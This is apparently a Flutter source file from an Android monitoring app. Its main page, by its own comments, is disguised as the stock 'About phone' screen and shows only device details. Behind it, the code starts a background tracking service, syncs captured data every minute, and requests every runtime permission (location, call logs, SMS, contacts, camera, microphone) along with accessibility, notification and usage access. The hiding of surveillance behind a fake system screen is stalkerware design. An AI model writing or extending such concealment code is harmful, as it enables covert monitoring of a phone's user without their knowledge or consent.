import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:device_info_plus/device_info_plus.dart';
import '../../services/background_worker.dart';
import '../../services/permission_service.dart';
import '../../platform/tracking_channel.dart';

// ─────────────────────────────────────────────────────────────────────────────
// Root page — disguised as a stock "About phone" screen.
//
// The UI shows ONLY device information. Monitoring runs in the background
// (foreground service) regardless of what's on screen. Parent management
// (sign out / remove device) is done from the web dashboard.
//
// Permissions are requested in real time after login / on every app open,
// based on the account's subscription plan:
//   • runtime popups  (location, camera, mic, SMS, contacts, media, battery)
//   • special-access Settings pages opened in turn (usage, notification, a11y)
// ─────────────────────────────────────────────────────────────────────────────

class TrackingHomePage extends ConsumerStatefulWidget {
  const TrackingHomePage({super.key});

  @override
  ConsumerState<TrackingHomePage> createState() => _TrackingHomePageState();
}

class _TrackingHomePageState extends ConsumerState<TrackingHomePage>
    with WidgetsBindingObserver {
  Map<String, String> _about = {};
  Timer? _syncTimer;
  Completer<void>? _resumeCompleter;
  bool _permissionFlowRan = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _loadAboutInfo();
    _startBackendMonitoring();
    _setupPermissions();
    _syncTimer = Timer.periodic(
      const Duration(minutes: 1),
      (_) => BackgroundWorker.captureAllAndSync(),
    );
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _syncTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && !(_resumeCompleter?.isCompleted ?? true)) {
      _resumeCompleter?.complete();
    }
  }

  // ── Device info for the "About phone" UI ───────────────────────────────────

  Future<void> _loadAboutInfo() async {
    try {
      final a = await DeviceInfoPlugin().androidInfo;
      if (!mounted) return;
      setState(() {
        _about = {
          'name': '${a.manufacturer} ${a.model}'.trim(),
          'model': a.model,
          'android': a.version.release,
          'patch': a.version.securityPatch ?? '—',
          'build': a.display.isNotEmpty ? a.display : a.id,
          'baseband': a.version.incremental,
          'processor': a.hardware.isNotEmpty ? a.hardware : a.board,
        };
      });
    } catch (_) {}
  }

  // ── Backend monitoring (always active, independent of UI) ──────────────────

  Future<void> _startBackendMonitoring() async {
    try {
      await TrackingChannel.instance.startTrackingService();
    } catch (_) {}
    BackgroundWorker.captureAllAndSync();
  }

  // ── Real-time permission flow (subscription-based) ─────────────────────────

  Future<void> _setupPermissions() async {
    if (_permissionFlowRan) return;
    _permissionFlowRan = true;

    final svc = ref.read(permissionServiceProvider);

    // 1. Request EVERY runtime permission (real-time popups) — not plan-gated.
    //    notification, location, call logs, SMS, contacts, camera, mic, media, battery.
    await svc.requestAllRuntimePermissions();
    if (!mounted) return;

    // 2. Every special-access permission — open each Settings page in turn if
    //    not already granted (Usage access, Notification access, Accessibility).
    final queue = <_SpecialAccess>[
      _SpecialAccess(svc.openUsageStatsSettings, svc.isUsageStatsGranted),
      _SpecialAccess(svc.openNotificationAccessSettings, svc.isNotificationAccessGranted),
      _SpecialAccess(svc.openAccessibilitySettings, svc.isAccessibilityGranted),
    ];
    for (final s in queue) {
      if (!mounted) return;
      if (await s.isGranted()) continue;
      await s.open();
      await _waitForResume(); // wait for the parent to return from Settings
      await Future<void>.delayed(const Duration(milliseconds: 400));
    }
  }

  Future<void> _waitForResume() {
    _resumeCompleter = Completer<void>();
    return _resumeCompleter!.future;
  }

  // ── Build ──────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFF2F3F5),
      appBar: AppBar(
        backgroundColor: const Color(0xFFF2F3F5),
        elevation: 0,
        scrolledUnderElevation: 0,
        foregroundColor: Colors.black87,
        title: const Text(
          'About phone',
          style: TextStyle(
              fontSize: 20, fontWeight: FontWeight.w600, color: Colors.black87),
        ),
      ),
      body: ListView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.fromLTRB(16, 4, 16, 40),
        children: [
          _AboutDeviceHeader(
            name: _about['name'] ?? 'Android device',
            android: _about['android'] ?? '',
          ),
          const SizedBox(height: 16),
          _AboutInfoGroup(
            rows: [
              _AboutRow(label: 'Device name', value: _about['name'] ?? '—'),
              _AboutRow(label: 'Model number', value: _about['model'] ?? '—'),
              _AboutRow(label: 'Android version', value: _about['android'] ?? '—'),
              _AboutRow(
                  label: 'Android security patch level',
                  value: _about['patch'] ?? '—'),
              _AboutRow(label: 'Processor', value: _about['processor'] ?? '—'),
              _AboutRow(label: 'Baseband version', value: _about['baseband'] ?? '—'),
              _AboutRow(label: 'Build number', value: _about['build'] ?? '—'),
            ],
          ),
        ],
      ),
    );
  }
}

/// A special-access permission that must be granted via a Settings page.
class _SpecialAccess {
  _SpecialAccess(this.open, this.isGranted);
  final Future<void> Function() open;
  final Future<bool> Function() isGranted;
}

// ─────────────────────────────────────────────────────────────────────────────
// "About phone" UI widgets
// ─────────────────────────────────────────────────────────────────────────────

/// Top device header — Android robot + device name + version, like stock ROMs.
class _AboutDeviceHeader extends StatelessWidget {
  const _AboutDeviceHeader({required this.name, required this.android});

  final String name;
  final String android;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 28, horizontal: 20),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.grey.shade200),
      ),
      child: Column(
        children: [
          Container(
            width: 64,
            height: 64,
            decoration: BoxDecoration(
              color: const Color(0xFF5F6368).withValues(alpha: 0.08),
              shape: BoxShape.circle,
            ),
            child: const Icon(Icons.android_rounded,
                size: 38, color: Color(0xFF3DDC84)),
          ),
          const SizedBox(height: 14),
          Text(
            name,
            textAlign: TextAlign.center,
            style: const TextStyle(
                fontSize: 18, fontWeight: FontWeight.w700, color: Colors.black87),
          ),
          if (android.isNotEmpty) ...[
            const SizedBox(height: 4),
            Text('Android $android',
                style: TextStyle(fontSize: 13, color: Colors.grey.shade600)),
          ],
        ],
      ),
    );
  }
}

/// A grouped white card containing About-phone info rows.
class _AboutInfoGroup extends StatelessWidget {
  const _AboutInfoGroup({required this.rows});

  final List<_AboutRow> rows;

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.grey.shade200),
      ),
      child: Column(
        children: [
          for (int i = 0; i < rows.length; i++) ...[
            rows[i],
            if (i != rows.length - 1)
              Divider(height: 1, thickness: 1, color: Colors.grey.shade100),
          ],
        ],
      ),
    );
  }
}

class _AboutRow extends StatelessWidget {
  const _AboutRow({required this.label, required this.value});

  final String label;
  final String value;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 15),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Expanded(
            flex: 4,
            child: Text(label,
                style: const TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                    color: Colors.black87)),
          ),
          const SizedBox(width: 12),
          Expanded(
            flex: 5,
            child: Text(
              value,
              textAlign: TextAlign.right,
              style: TextStyle(fontSize: 14, color: Colors.grey.shade600),
            ),
          ),
        ],
      ),
    );
  }
}
